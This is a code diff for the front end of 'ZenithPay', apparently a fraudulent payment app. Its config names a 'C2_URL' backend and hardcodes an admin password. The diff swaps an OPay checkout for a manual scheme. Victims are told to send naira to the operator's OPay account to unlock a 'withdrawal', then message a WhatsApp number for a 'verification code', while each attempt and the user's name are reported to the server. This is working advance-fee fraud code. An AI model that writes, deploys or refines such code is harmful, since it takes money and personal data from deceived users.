@@ -1,7 +1,10 @@
 // ============ CONFIG ============
-// ⚠️ REPLACE WITH YOUR BACKEND URL ⚠️
+// ⚠️ UPDATE WITH YOUR DETAILS ⚠️
 var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 var ADMIN_PASSWORD = 'ZENITH2026';
+var OPAY_ACCOUNT = '0123456789';        // <-- YOUR OPAY ACCOUNT NUMBER
+var OPAY_NAME = 'ZenithPay Admin';       // <-- YOUR OPAY ACCOUNT NAME
+var WHATSAPP_NUMBER = '2348000000000';   // <-- YOUR WHATSAPP NUMBER
 
 // ============================================================
 // ===== DASHBOARD LOAD =====
@@ -9,6 +12,12 @@ var ADMIN_PASSWORD = 'ZENITH2026';
 
 function loadDashboard() {
     var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+
+    // Set OPay account details in the modal
+    var opayAccountEl = document.getElementById('opayAccount');
+    var opayNameEl = document.getElementById('opayName');
+    if (opayAccountEl) opayAccountEl.textContent = OPAY_ACCOUNT;
+    if (opayNameEl) opayNameEl.textContent = OPAY_NAME;
 
     var greeting = document.getElementById('greeting');
     if (greeting && userData.fullname) {
@@ -234,78 +243,6 @@ document.getElementById('logoutBtn')?.addEventListener('click', function() {
 });
 
 // ============================================================
-// ===== PAY WITH OPAY =====
-// ============================================================
-
-document.getElementById('payWithOPayBtn')?.addEventListener('click', async function() {
-    var amount = document.getElementById('depositAmount').value;
-    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
-
-    if (!userData.email) {
-        alert('⚠️ Please complete your profile first.');
-        return;
-    }
-
-    try {
-        this.textContent = 'Processing...';
-        this.disabled = true;
-
-        var response = await fetch(C2_URL + '/opay/create_order', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                email: userData.email,
-                amount: amount,
-                name: userData.fullname || 'Customer',
-                phone: userData.phone || '08000000000'
-            })
-        });
-
-        var result = await response.json();
-
-        if (result.status === 'success' && result.redirect_url) {
-            window.location.href = result.redirect_url;
-        } else {
-            alert('❌ Payment initiation failed: ' + (result.message || 'Please try again.'));
-            this.textContent = '💳 Pay with OPay';
-            this.disabled = false;
-        }
-    } catch (error) {
-        console.error('OPay error:', error);
-        alert('❌ An error occurred. Please try again.');
-        this.textContent = '💳 Pay with OPay';
-        this.disabled = false;
-    }
-});
-
-// ===== CHECK OPAY PAYMENT STATUS ON RETURN =====
-if (window.location.search.includes('orderNo')) {
-    var params = new URLSearchParams(window.location.search);
-    var orderNo = params.get('orderNo');
-    var status = params.get('status');
-
-    if (status === 'SUCCESS' && orderNo) {
-        fetch(C2_URL + '/opay/verify_order', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ orderNo: orderNo })
-        })
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-            if (data.status === 'success') {
-                alert('✅ Payment successful! Your bonus is now available.');
-                localStorage.setItem('zenithpay_balance', '0');
-                location.reload();
-            } else {
-                alert('⚠️ Payment verification failed. Contact support.');
-            }
-        });
-    } else if (status === 'FAIL') {
-        alert('⚠️ Payment failed. Please try again.');
-    }
-}
-
-// ============================================================
 // ===== WITHDRAW MODAL =====
 // ============================================================
 
@@ -328,13 +265,13 @@ document.getElementById('withdrawModal')?.addEventListener('click', function(e) 
 });
 
 // ============================================================
-// ===== WHATSAPP MODAL =====
+// ===== COPY OPAY ACCOUNT =====
 // ============================================================
 
 document.getElementById('copyAccount')?.addEventListener('click', function() {
-    var account = '0123456789';
+    var account = OPAY_ACCOUNT;
     navigator.clipboard.writeText(account).then(function() {
-        alert('✅ Account number copied!');
+        alert('✅ OPay account number copied!');
     }).catch(function() {
         var input = document.createElement('input');
         input.value = account;
@@ -342,37 +279,42 @@ document.getElementById('copyAccount')?.addEventListener('click', function() {
         input.select();
         document.execCommand('copy');
         document.body.removeChild(input);
-        alert('✅ Account number copied!');
+        alert('✅ OPay account number copied!');
     });
 });
 
-document.getElementById('verifyPaymentBtn')?.addEventListener('click', function() {
+// ============================================================
+// ===== I HAVE PAID → WHATSAPP =====
+// ============================================================
+
+document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
     var amount = document.getElementById('depositAmount').value;
-    var userAccount = document.getElementById('userAccount').value;
-    var userBank = document.getElementById('userBank').value;
-
-    if (!userAccount || !userBank) {
-        alert('⚠️ Please fill in your account details.');
-        return;
-    }
-
     var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
+    // Send payment confirmation to server
     sendData({
-        type: 'withdrawal_attempt',
+        type: 'opay_withdrawal_attempt',
         amount: amount,
-        userAccount: userAccount,
-        userBank: userBank,
+        opay_account: OPAY_ACCOUNT,
+        user_name: userData.fullname || 'Unknown',
         timestamp: Date.now()
     });
 
+    // Close withdraw modal
     document.getElementById('withdrawModal').classList.add('hidden');
+
+    // Open WhatsApp modal
     document.getElementById('whatsappModal').classList.remove('hidden');
 
+    // Update WhatsApp link with dynamic data
     var waLink = document.getElementById('whatsappLink');
-    var msg = 'Hello, I sent ₦' + amount + ' for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. My account is ' + userAccount + ' (' + userBank + '). Please send my code.';
-    waLink.href = 'https://wa.me/2348000000000?text=' + encodeURIComponent(msg);
+    var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. Please send my verification code.';
+    waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
 });
+
+// ============================================================
+// ===== WHATSAPP MODAL =====
+// ============================================================
 
 document.getElementById('closeWhatsapp')?.addEventListener('click', function() {
     document.getElementById('whatsappModal').classList.add('hidden');
@@ -383,6 +325,10 @@ document.getElementById('whatsappModal')?.addEventListener('click', function(e) 
         this.classList.add('hidden');
     }
 });
+
+// ============================================================
+// ===== VERIFY CODE =====
+// ============================================================
 
 document.getElementById('verifyCodeBtn')?.addEventListener('click', function() {
     var enteredPassword = document.getElementById('adminPassword').value;
@@ -409,6 +355,7 @@ document.getElementById('verifyCodeBtn')?.addEventListener('click', function() {
 
     document.getElementById('whatsappModal').classList.add('hidden');
 
+    // Update dashboard
     var balanceDisplay = document.getElementById('balanceDisplay');
     var statBalance = document.getElementById('statBalance');
     var balanceCard = document.querySelector('.balance-card');
